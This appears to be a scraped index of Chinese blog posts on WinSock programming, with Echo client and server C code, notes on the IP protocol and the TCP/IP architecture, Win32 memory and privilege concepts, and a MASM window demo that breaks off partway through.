集中式系统集中式系统有一个大型的中央处理器，中央处理器是一台高性能、可扩充的计算机，所有的数据、运算、任务处理全部在中央计算机系统上完成。 我们在日常生活中银行ATM和超市收款机等使用的都是集中式系统 分布式系统分布式系统是相对于集中式系统而言的。分布式系统由许多不同的机器组成，每台机器都有自己的数据库、中央处理器、终端等，它们在屋里上是分散的，在逻辑上属于同一系统。它的特点： 高度的可靠性：数据分散存储在网络中不同的机器上 均衡负载：每台主机可以缓存本地的常用数据，不需频繁的访问服务器 满足不同的资源：用户可以依据自己的需要在他自己的主机上安装不同的操作系统 Echo客户程序Echo是互联网上一个标准协议，它也是一个非常有用的调试和测量工具。它既可以使用TCP，也可以使用UDP协议，知名端口号是7，下面使用TCP来实现这个协议； 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778/************************************************************************* * * Copyright (c) 2002-2005 by Zhang Huiyong All Rights Reserved * * FILENAME: EchoClnt.c * * PURPOSE : ECHO 协议客户端程序. * * AUTHOR : 张会勇 * * BOOK : &lt;&lt;WinSock网络编程经络&gt;&gt; * **************************************************************************/#include &lt;stdio.h&gt;#include &lt;winsock2.h&gt; #pragma comment(lib, &quot;ws2_32&quot;) /* WinSock 使用的库函数 */#define ECHO_DEF_PORT 7 /* 连接的缺省端口 */#define ECHO_BUF_SIZE 256 /* 缓冲区的大小 */int main(int argc, char **argv){ WSADATA wsa_data; SOCKET echo_soc = 0; /* socket 句柄 */ struct sockaddr_in serv_addr; /* 服务器地址 */ unsigned short port = ECHO_DEF_PORT; int result = 0, send_len = 0; char *test_data = &quot;Hello World!&quot;, recv_buf[ECHO_BUF_SIZE]; if (argc &lt; 2) { printf(&quot;input %s server_address [port]\\n&quot;, argv[0]); return -1; } if (argc &gt;= 3) port = atoi(argv[2]); WSAStartup(MAKEWORD(2,0), &amp;wsa_data);/* 初始化 WinSock资源 */ send_len = strlen(test_data); /* 服务器地址 */ serv_addr.sin_family = AF_INET; serv_addr.sin_port = htons(port); serv_addr.sin_addr.s_addr = inet_addr(argv[1]); if (serv_addr.sin_addr.s_addr == INADDR_NONE) { printf(&quot;[ECHO] invalid address\\n&quot;); return -1; }; echo_soc = socket(AF_INET, SOCK_STREAM, 0); /* 创建 socket */ result = connect(echo_soc, (struct sockaddr *)&amp;serv_addr, sizeof(serv_addr)); //服务器建立链接，地址为第二个参数中结构体指定，第三个参数是结构体长度 if (result == 0) /* 连接成功 */ { result = send(echo_soc, test_data, send_len, 0); //发送数据使用send，第二个参数是数据缓冲区，第三个参数是长度 result = recv(echo_soc, recv_buf, ECHO_BUF_SIZE, 0); //接受数据使用recv，// } if (result &gt; 0) { recv_buf[result] = 0; printf(&quot;[Echo Client] receives: \\&quot;%s\\&quot;\\r\\n&quot;, recv_buf); } else printf(&quot;[Echo Client] error : %d.\\r\\n&quot;, WSAGetLastError()); closesocket(echo_soc); //关闭连接 WSACleanup(); //释放WinScok资源 return 0;} Echo服务器程序12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485/************************************************************************* * * Copyright (c) 2002-2005 by Zhang Huiyong All Rights Reserved * * FILENAME: EchoSrv.c * * PURPOSE : ECHO 协议服务器程序. * * AUTHOR : 张会勇 * * BOOK : &lt;&lt;WinSock网络编程经络&gt;&gt; * **************************************************************************/#include &lt;stdio.h&gt;#include &lt;winsock2.h&gt; #pragma comment(lib, &quot;ws2_32&quot;) /* WinSock 使用的库函数 */#define ECHO_DEF_PORT 7 /* 侦听的缺省端口 */#define ECHO_BUF_SIZE 256 /* 缓冲区的大小 */int main(int argc, char **argv){ WSADATA wsa_data; SOCKET echo_soc = 0, /* 侦听 socket 句柄 */ acpt_soc = 0; struct sockaddr_in serv_addr, /* socket的本地地址 */ clnt_addr; /* socket的远端地址 */ unsigned short port = ECHO_DEF_PORT; int result = 0; int addr_len = sizeof(struct sockaddr_in); char recv_buf[ECHO_BUF_SIZE]; if (argc == 2) port = atoi(argv[1]); WSAStartup(MAKEWORD(2,0), &amp;wsa_data);/* 初始化 WinSock资源 */ echo_soc = socket(AF_INET, SOCK_STREAM, 0); /* 创建 socket */ /* socket 的本地地址 */ serv_addr.sin_family = AF_INET; serv_addr.sin_port = htons(port); serv_addr.sin_addr.s_addr = INADDR_ANY; result = bind(echo_soc, (struct sockaddr *)&amp;serv_addr, sizeof(serv_addr)); if (result == SOCKET_ERROR) { printf(&quot;[Echo Server] bind error: %d\\n&quot;, WSAGetLastError()); closesocket(echo_soc); return -1; } listen(echo_soc, SOMAXCONN); printf(&quot;[Echo Server] is running ... ...\\n&quot;); while (1) { acpt_soc = accept(echo_soc, (struct sockaddr *)&amp;clnt_addr, &amp;addr_len); if (acpt_soc == INVALID_SOCKET) { printf(&quot;[Echo Server] accept error: %d\\n&quot;, WSAGetLastError()); break; } result = recv(acpt_soc, recv_buf, ECHO_BUF_SIZE, 0); if (result &gt; 0) { recv_buf[result] = 0; printf(&quot;[Echo Server] receives: \\&quot;%s\\&quot;, from %s\\r\\n&quot;, recv_buf, inet_ntoa(clnt_addr.sin_addr)); result = send(acpt_soc, recv_buf, result, 0); } closesocket(acpt_soc); } closesocket(echo_soc); WSACleanup(); return 0;}","link":"/2019/11/07/WinSock%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E7%BB%8F%E7%BB%9C-Echo%E5%AE%A2%E6%88%B7-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%A8%8B%E5%BA%8F/"},{"title":"WinSock网络编程经络-IP","text":"互联网中的IP是一个主机到主机的协议，TCP、UDP、ICMP和IGMP都封装在IP数据报中传输，它是整个TCP/IP协议的核心部分，是所有互联网通信的基础 设计思想选择IP协议主要有以下几点原因： IP协议对底层网络提供的服务做了最少的假设，不要求网络具有一些通常再主机到主机的协议中使用的一些机制 虚电路通常只能使用一种固定类型的服务，而IP协议使用数据报作为它的信息单元，只提供了最基本的功能：把数据从源主机传送到目的主机。 IP协议不要求中间结点，如路由器保存状态信息，一旦中间链路或节点出现了故障，数据报可以选择其他的路径，而仍然可以保持上层协议的正常通信。 操作模型上层协议有数据发送时，调用IP模块的接口函数，把数据、目的地址及其他参数传递给IP层。IP协议再消息的前面增加数据报首部，然后查找本地路由表，确定把数据报发送到哪个物理地址。如果目的主机与源主机位于同一网络，目的网络地址就算目的主机的物理地址；否则，找到通往目的主机的路由器，并把路由器的地址作为目的物理地址 主要功能IP协议的功能和目的就是在互相连接的网络间传输数据报，为了完成这个功能，它把数据报从一个IP模块传送到另一个IP模块，一直到目的主机。 中间节点使用IP首部中的目的地址为数据报选择路由，路由过程中，数据报可能会通过MTU小于数据报大小的网络，为了客服这个困难，IP协议提供了分片机制 寻址和选路：名字、地址和路由的区别是：名字表明我们所看到的，地址指明它在哪里，路由则指示如何到达那里，IP协议主要处理地址和路由 封装和解析：接受其他协议的数据，发送之前把它们按照协议的要求封装在IP数据报中。接受数据时根据IP数据报首部中的信息把其他协议的数据解析出来并交给不同的协议去处理 分片和重组：TCP/IP设计的一个主要思想是硬件无关性，要能够在不同的屋里网络上运行。如果IP数据报的长度超过MTU时，对数据进行分片，把数据报分配成与MTU相近大小的片再由物理网络传输。数据报分片后，每片都作为独立的数据传输，当到达目的主机后，需要执行相反的过程，即把这些数据报重组成原来的内容 数据报格式IP数据报类似于数据链路上传输的帧，但帧只能用于同一个物理网络的数据传输，而IP数据报的设计是为了跨越互联网传输数据，由软件来处理，格式和内容都与硬件无关。和所有的网络协议报文一样，IP数据报由特定的格式，概念上可以分为两种：首部和负载。首部包含了地址、服务类型及控制信息；而负载承担了要在网络上发送或接受数据 版本号(Version)目前光放使用的版本是4，版本定义了数据报的格式。发送方、中间的路由器和接收方都要按照版本定义的标准来处理数据报。如果数据报的版本与它预期不一致，就要抛弃该数据报，以避免使用错误的格式来解释数据报内容 首部长度(Hander Length)首部长度是IP首部占32位字的长度，包括任何选项，它指向了数据的开始。 服务类型服务类型用于指明程序需要的服务质量。比如数据报通过一个特定的网络时，这些参数能够辅助路由器做出路由决策。RFC1349对服务类型做了标准化，把一个字节的TOS划分位许多个子字段 延迟、吞吐量、可靠性、成本每个占1位，4位中只能设置其中一位，不能同时设置。 总长度以字节为长度的数据报长度，包括首部和数据。总长度字段为16Bit，能标识65535个字节。 标识符表示了主机发送的每一个数据报，辅助接收方对数据的重组，发送主机必须为每一个发送的数据报生成唯一的值； 标志分片控制标志，3Bit，每个bit的意义如下： 片偏移13bit，是指该片距离原始数据报数据部分开始的位置，以8字节的倍数计量，除最后一片外，分片的大小必须是8字节的倍数 生存时间设置了数据报能够再互联网系统中存在的最长时间，以秒为单位。入宫数据报的生存时间为0，则必须被销毁，每个处理数据报的模块都要把TTL至少减去1，即使它处理数据报的时间小于1. 协议指明数据报数据部分属于哪个协议，长度是8bit，最多而可以有255个协议，每个协议用一个数值表示，它们之间的映射由IANA统一管理 首部校验和IP数据报首部校验和，用于校验首部的有效性和完整性。校验和的计算是首部校验和字段设置0，首部堪称是16bit的整数序列，计算每个16位整数的反码，再求它们的和。 地址源IP地址和目的IP地址字段包含了发送主机和接受主机的IP地址，经过中间的路由器时，都是用目的地址进行选路的 选项用于控制、度量和调试，在每个数据报中它是可选的，数据报可以有，也可以没有，依赖于用户的设置，但IP鞋洗必须实现对选项的处理；","link":"/2019/11/08/WinSock%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E7%BB%8F%E7%BB%9C-IP/"},{"title":"WinSock网络编程经络-TCP&#x2F;IP体系结构","text":"TCP/IP得名字来自互联网协议簇中最重要得协议：传输控制协议(TCP)和网络协议(IP)。它们分别位于TCP/IP模型得第三层和第四层，互联网协议簇中得许多关键特征都是在 这两层中实现得。 TCP/IP体系结构术语TCP/IP得名字来自互联网协议簇中最重要得协议：传输控制协议(TCP)和网络协议(IP)。它们分别位于TCP/IP模型得第三层和第四层，互联网协议簇中得许多关键特征都是在 这两层中实现得。 当应用程序需要发送数据时，它把数据交给TCP/IP协议，数据在向下层传递过程中，每一层都要对数据进行封装，增加一些头部或尾部信息。这些网络协议中传输得数据一般得称呼是报文。 数据在不同层中时得常用称呼： 段(segment) 段在TCP协议中，一个段是指端到端得传输单位，它包括了TCP首补及后面得应用程序数据，被封装在IP数据报中传输、 消息(Message) 在底层协议得描述中，消息是指传输层协议得数据单位。 IP数据报(IP Datagram) 用于IP协议中，一个IP数据报是IP协议中端到端得传输单位，即IP首部后面跟着一个消息。 分组(Packet) 分组是通过网络层和链路层之间得接口传递得数据单位，它包含了IP首部和后面得数据，一个分组可以是完整得IP数据报，也可以是IP数据包得分片 帧(Frame) 帧是链路层协议中得传输单位，包括链路层首部和后面得分组。 模型OSI参考模型定义了计算机互联标准，它根据不同功能把网络划分为7个层次。在OSI参考模型之前，用于网络互连得TCP/IP协议已经被广泛使用了。 TCP/IP模型包含了四层：应用层、传输层、网络层、网络接口层。 网络接口层网络接口层是TCP/IP协议于底层硬件得接口，负责网络层与屋里设备之间得数据交换，在TCP/IP中主要为IP协议发送和接受数据。 TCP/IP模型对网络接口层定义得比较宽松，即可以座位单独得得协议实现； 网络层网络层是提供主机到主机之间得数据传送服务，它是不可卡得，知识把上层交给它数据”尽力投递”给下一节点。网络层是TCP/IP协议得基础，所有其他协议得功能都是建立在它基础之上得，数据得发送和接受都是通过网络层进行处理得。 网络层主要包括三个协议：互相网协议(IP)、互联网控制报文协议(ICMP)、互联网组管理协议(IGMP) IP协议是无连接得，它把每个数据报都看作是独立得，与其他得数据报练习，向目的地址传输数据时不需要建立连接或虚电路。 传输层传输层为主机上得应用程序提供端到端得通信能力。主要包括两个协议：TCP(传输控制协议)和UDP(用户数据报协议)。 TCP是面向连接得，为主机上得两个应用程序提供可靠得数据通信。TCP是全双工得，通信得设备之间在开始传输前先建立一个虚电路，然后就可以在两个方向上传送数据。 UDP是无连接、不可靠得协议，它提供的服务非常简单，只把应用程序的数据进行封装，并提供有限的错误检测(校验和)。用UDP传送的数据可能会失序、丢失、重复，这些都需要应用程序自己来控制。 应用层位于TCP/IP模型的最高层，包括了OSI模型中的第5、6、7三层。 应用层包含了非常广泛的协议，加密解密、压缩和解压缩都可以在应用层完成。 常用的应用层协议有：超文本传输协议HTTP、文件传输协议FTP、邮件协议SMTP、远程终端Telnet、动态主机配置协议DHCP、域名系统DNS等 架构TCP/IP网络架构在实现中，应用程序是调用socket接口使用底层协议，而不是直接与底层协议打交道。TCP/IP协议簇中，应用层协议是最多的。 TCP是面向连接的传输层协议，里面是字节流，它按照应用程序交给它的顺序依此发送数据，不区分数据的边界。 UDP是不可靠的，不能保证应用程序的数据可靠地到达目的地，它也是无连接的，不需要维护连接所带来的负担，它只是把应用程序交给它的苏剧进行简单的封装，然后发出去，因此数据传输速度较快。 IP是网络层的重要协议，TCP和UDP都使用IP传输数据。应用层协议也可以调用原始的socket，直接访问ip层 数据的一生TCP/IP的数据传输过程与发信相似。发信时，外面是信封，里面放上写的内容；TCP/IP发送数据时，前面放上协议首部，后面是应用程序的数据； 数据封装应用程序与另一台主机上的程序通信时，它们之间会有一系列的数据交换，对于任何一端，发送数据时，会把对方的IP地址、端口号和数据交给TCP/IP协议。TCP/IP协议对数据进行封装，每一层都在前面加上本层的首部，紧接着是上一层传递给它的数据，一些链路层协议还会在最后追加尾部； TCP层并不是在应用层数据前面简单地增加首部，而是根据建立连接时与对方协防出的参数最大段大小(MSS)，把数据分为TCP段，每个TCP段的前面是首部，后面是数据。如果应用层数据太大，就会被分为多个TCP段，TCP把这些段交给IP去传输 IP协议一次能处理的数据长度是有限制的，由IP首部的16位长度字段决定，最大值65535 数据到达网络接口，会被封装成适合屋里硬件传输的帧，增加首部，有的追加尾部； 数据被封装为帧后，就发送到屋里地址上，向目的地传送 数据分用数据帧到达目的主机的时候，数据沿着协议栈自底向上传递，每一层都会对数据做一些检查，确定无误后，就去掉本层协议的首部； IP收到数据后，如果数据是分片的，并不会立即把数据传给上层协议，而是保存在IP队列中，等所有的片到达后，执行重组，再交给其他协议处理； UDP收到数据报后，执行简单的验证后就交给应用程序了；而TCP会检查收到的TCP段是否前面有数据丢失，如果有它也会先保留收到的段，等对方把丢失的段全部发送过来后，再一起交给应用程序","link":"/2019/11/07/WinSock%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E7%BB%8F%E7%BB%9C-TCP-IP%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"title":"Windows-Assembly-1","text":"背景知识Win32软硬件平台80x86系列处理器简史Win32可以在多种硬件平台上运行，但使用最广泛的硬件平台是基于Intel（英特尔）公司80x86需苦厄处理器的微型计算机 80386处理器在设计的时候考虑多用户及多任务的需要，在芯片中增加了保护模式、优先级、任务切换和片内的内储管理等硬件单元。 为了兼容已有软件，在寄存器、运行模式和内存管理模式等大多方面还是继承了早期的80386模式；80386后处理器虽增加了新指令，但大多用于多媒体扩展 Windows历史Win32指的是32位的Windows操作系统。 Windows的早期是MS-DOS系统。 为了利用MS-DOS时代的应用，保持向下兼容性，Windows 9x的内核模块还有许多地方使用16位变成，但是在变成模式上支持32位编程模式。 Windows NT系列和Windows 9x都支持Win 32API，Win32 APi位应用系统提供了大量的系统功能调用。 Windows特色 图形用户界面（GUI） –Windows使用户报脱了字符界面操作系统必须死记的键盘命令和令人一头雾水的提示。 一致的用户界面 使初学者便于使用 多任务 用户可以同时运行多个程序；另一个好处是可以在不同的程序之间传递数据。 大量的函数调用 Win32支持上千种函数调用，几乎涉及所有的方面 和设备的无关性 Win32程序并不直接访问屏幕、打印机和键盘灯硬件设备，Windows虚拟了所有的硬件。 内存管理 由于内存分页和虚拟内存的使用，每个程序都使用4GB的地址空间，DOS变成时代必须考虑640KB内存问题已经成为历史。 必须了解的基础知识80x86处理器的工作模式8086处理器有三种工作模式：实模式、保护模式和虚拟86模式。 实模式80386处理器被复位或家电的时候以实模式启动。 实模式下的80386处理器不支持优先级，所有的指令相当于工作在特权级（优先级0），所以它可以执行所有的特权执行，包括读写控制寄存器CR0等。 保护模式当80386工作在保护模式下的时候，它的所有功能都是可用的。这时80386所有的32根地址线都可供寻址，物理内存高达4GB。在保护模式下，支持内存分页机制，提供了对虚拟内存的良好支持。 保护模式下80386支持多任务，可以依靠硬件仅在一条指令中实现任务的切换。任务环境的保护工作是由处理器自动完成的。 DOS操作系统运行于实模式下，而Windows操作系统运行在保护模式下 虚拟x86模式虚拟86模式是为了在保护模式下执行8086程序而设置的。 虚拟86模式是以任务形式在保护模式上执行的，在80386上可以同时支持多个由真正的80386任务和虚拟86模式构成的任务。在虚拟86模式下，80386支持任务切换和内存分页 8086代码中有相当一部分的指令是在保护模式下属于特权指令，如屏蔽中断的cli和中断返回指令iret等。 Windows的内存管理DOS操作系统的内存安排DOS操作系统运行于实模式下，由于8086处理器的寻址范围只有1MB，当时系统硬件使用的存储器地址被安排在高端，地址是从A0000h(即640KB)开始的384KB中，其中有用于显示的视频缓冲区和BIOS的地址空间。而在内存低端，安排了中断向量表和BIOS数据区；剩下从500h开始到A0000h总共不到640KB的内存是操作系统和应用程序所能够使用的；应用程序不可能使用这640KB以外的内存。 80386处理器的寻址范围达到了4GB，利用XMS驱动程序可以访问到所有的4GB地址空间。 但16位的段寄存器限制DOS程序，“可见”的内存范围还是停留在0000h到FFFF0h+64KB的范围中。 80386的内存寻址机制实模式下的内存寻址方式： 80386的保护模式寻址方式： 80386中引入了两个新的寄存器来管理段描述符表；一个是48位的全局描述符表寄存器GDTR，一个是16位的局部描述符表段寄存器LDTR。 GFTR：指向的描述符表位全局描述符表。它包含系统中所有任务都可用的段描述符，通常包含描述操作系统使用的代码段、数据段和堆栈段中的描述符以及各任务的LDT段等；全局描述符表只有一个。 LDTR：只想局部描述符表LDT。80386处理器设置成每个任务都有一个独立的DTL。它包含每个任务私有的代码段、数据段和堆栈段的描述符，也包含该任务所使用的一些门描述符。 不同任务的局部描述符号表分别组成不同的内存段，描述这些内存段的描述符当作系统描述符放在全局描述符表中。 80386内存的分页机制在实模式下寻址的时候，“段寄存器+偏移地址”经过转换计算以后得到的地址是“物理地址”，也就是操作系统中的实际地址。而保护模式下“段选择器+偏移地址”转换后的地址成为“线性地址”而不是“物理地址”。 在单任务的DOS中，一个应用程序可以使用所有的空间内存。程序退出后，操作系统回收所有的碎片内存并且组成一个大内存提供给下一个程序使用。 对于一个多任务的操作系统，内存的碎片化是不能容忍的，否则在系统运行一段时间以后，即使空间内存的总和很大，也可能出现任何一片内存都小到无法装入执行程序的独步。 80386处理器的分页机制就解决了这个问题，80386处理器把4KB大小的一块内存当作一“页”内存，每页物理内存可以根据“页目录”和“也表”，随意映射到不同的线性地址上。这样就可以将物理地址不连续的内存的映射连接到一起，在线性地址上视为连续。 内存分页管理只能在保护模式下才可以实现，实模式不支持分页内存机制。但不管在哪种模式下，所有寻址指令使用的都是线性地址，程序不用关心数据最后究竟存储到了物理内存的哪个地方。 页表规定的不仅是地址的映射，同时还规定了页的访问属性，如是否可写、可读和执行等。比如把代码所在的内存页可读与执行，那么权限不够的代码向它写数据就会引发保护异常。利用这个机制可以在硬件层次上支持虚拟内存的实现 Windows内存的安排Windows操作系统一般在硬盘上建立大小为物理地址内存地址两倍的交换空间（文件名在Windows9x的Win386.awp，Windows NT下位PageFile.sys）用做虚拟内存。 利用80386下的内存分页机制，交换文件在寻址上可以很方便的作为内存使用。只需要在真正访问到的时候将硬盘文件的内容读入物理空间，然后重新将线性地址映射到这块物理内存就可以了。同样道理，被执行的可执行文件也不必真正装入内存，只要在页表中建立应映射管理，以后真正运行到某处代码的时候再将它调入物理内存即可 Win32变成中的重要概念： 每个应用程序都有自己的4GB的寻址空间。该控件可以存放操作系统、系统DLL和用户DLL的代码，它们之中有各种函数提供给应用程序调用。再除去其他的一些空间，余下的应用程序的代码、数据和可分配的地址空间 不同应用程序的线性地址空间是隔离的。虽然它们在物理内存中同时存在，但是在某个程序所属的时间片中，其他应用程序的代码和数据没有被映射到课寻址的线性地址中，所以是不可访问的。 DLL程序没有自己“私有”的空间，它们总是被映射到其他应用程序的地址空间，当作其程序的一部分运行。 从Win32汇编的角度看内存寻址段描述符在Windows系统总是由系统建立并且分配给用户的，否则用户自己构造的描述符来访问操作系统不希望用户访问的代码或者数据。任何权限开放引发的安全问题都是很严重，如Windows 9x中的中断描述符表是可以自己写的，CIH病毒可利用它将自己的权限提高到优先级0；而Windows NT下的中断描述符是不可写的，所以CIH病毒病没有对Windows NT用户造成困扰。 CIH病毒 Windows系统位用户程序分配好了一切工作。具体表在为用户程序的代码段、数据段和堆栈段全局预定义好了段描述符。这些段的起始地址为0，限制长度位FFFFFFFF，所以用它们可以直接寻址全部的4GB地址空间。程序开始的时候，CS、DS、ES、SS都已经只想了正常的描述符。 Windows的特权保护80386的中断和异常中断指当程序执行过程中有更重要的事情需要实时处理时，硬件通过中断控制器通知处理器。处理器暂时挂起当前运行的程序，转移到中断处理程序中：当中断处理程序处理完毕后，通过iret指令回到原先被打断的程序中断继续执行。 实模式下的中断和异常的处理过程： 中断向量表位于物理内存00000h开始的400h字节中，共支持100h个中断向量：每一个向量中断是一个xxxx：yyyy格式的地址，共占用4字节 在保护模式下，中断或异常处理往往从用户代码切换到操作系统代码中执行。 保护模式下增加了“门”的概念。“门”指向某个优先级高的程序所规定的入口点，所有优先级低的程序调用优先级高的程序只能通过门重定向，进入门所规定的入口点 80386的门分为中断门、自陷门和任务门 在保护模式下要表示一个中断或异常服务程序的信息需要用8个字节，包括门的种类以及xxxx：yyyyyyyy格式的入口地址等。这组信息叫做“中断描述符”。 80386的保护机制80386共支持4个优先级：0~3级：0级是最高级（特权级）、3级是最低级（用户级） 80386采用保护机制的组成： 段的类型检查：段的类型是由描述符指定的，主要属性由是否可执行，是否可读和是否可写等。 页的类型检查：除了可以在段级别上指定整个段是否可读可写外，在页表中页可以位每个页指定是否可写。 访问数据时的级别检查：优先级低的代码不能访问优先级高的数据段。 控制转移的检查：在处理中，很多指令可以实现控制转移，如jmp、call、ret、int和iret等指令 指令集的检查：第一类是改变GDT，LDT，IDT以及控制寄存器等关键寄存器的指令，称为特权指令；第二类是操作I/O端口的指令以及cli和sti等改变中断允许的指令，称为敏感指令。 I/O操作的保护：I/O地址也是受保护的对象。因为通过I/O操作可以绕过系统对很多硬件进行空间。80386可以单独为I/O空间提供保护，每个任务有个TSS来记录任务切换信息 Windows的保护机制在Windows下，操作系统运行于0级，应用程序运行于3级。Windows不允许使用1和2这两个级别的优先级。 Win32汇编变成中要注意避免以下的越权操作： 显而易见，所有的特权指令都是不可执行的，如lgdt，lldt，lidt指令和对CRx与TRx等寄存器赋值。 Windows在页表中把代码段和数据段中的内存页赋予了不同的数据。代码段是不可写的，数据段中也只有变量部分的页面是可写的。所以虽然可以寻址所有4GB空间，但访问超过权限规定以外的内存也是会引发保护异常的 在Windows 98中，系统硬件用的I/O端口是受保护的，但其余的则可以操作。在Windows NT中，任何的端口操作都是被拒绝的。","link":"/2019/08/29/Windows-Assembly-1/"},{"title":"Windows-Assembly-4","text":"回想一下，我们每天在使用Windows，屏幕上的一个个方块就是一个窗口，那么，为什么窗口是这个样子呢？ 窗口是什么使用窗口的原因在Windows3.0推出之前，计算机的屏幕一直使用文本模式，在单任务的年代，这种方式是hi分合理，但是如果在多任务的现在，这样的方式并不可取，Windows是多任务的操作系统，可以同时运行多个程序，同时多个程序在屏幕的显示并不可以互相干扰，这中间的任务调度是Windows完成的。 窗口和程序一个窗口并不一定是一个程序，它可能只是程序的一部分。反过来，运行的程序并非一定是窗口。 窗口程序是怎么运行的窗口程序的运行模式DOS程序员熟悉的是顺序化的、按过程驱动的程序设计方式，这种程序有明显的开始和结束，由程序运行的阶段来决定用户该做什么。 而窗口程序是事件驱动的，用户可能随时罚出各种消息，这意味着程序要随时可以处理退出请求。 FirstDemo123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112 .386 .model flat,stdcall option casemap:none;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; Include 文件定义;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include windows.incinclude gdi32.incincludelib gdi32.libinclude user32.incincludelib user32.libinclude kernel32.incincludelib kernel32.lib;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 数据段;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data?hInstance dd ?hWinMain dd ? .constszClassName db 'MyClass',0szCaptionMain db 'First Windows',0szText db 'Win32 Assembly!!',0;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 代码段;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .code;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 窗口过程;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;_ProcWinMain proc uses ebx edi esi hWnd,uMsg,wParam,lParam local @stPs:PAINTSTRUCT local @stRect:RECT local @hDc mov eax,uMsg;******************************************************************** .if eax == WM_PAINT invoke BeginPaint,hWnd,addr @stPs mov @hDc,eax invoke GetClientRect,hWnd,addr @stRect invoke DrawText,@hDc,addr szText,-1,\\ addr @stRect,\\ DT_SINGLELINE or DT_CENTER or DT_VCENTER invoke EndPaint,hWnd,addr @stPs;******************************************************************** .elseif eax == WM_CLOSE invoke DestroyWindow,hWinMain invoke PostQuitMessage,NULL;******************************************************************** .else invoke DefWindowProc,hWnd,uMsg,wParam,lParam ret .endif;******************************************************************** xor eax,eax ret_ProcWinMain 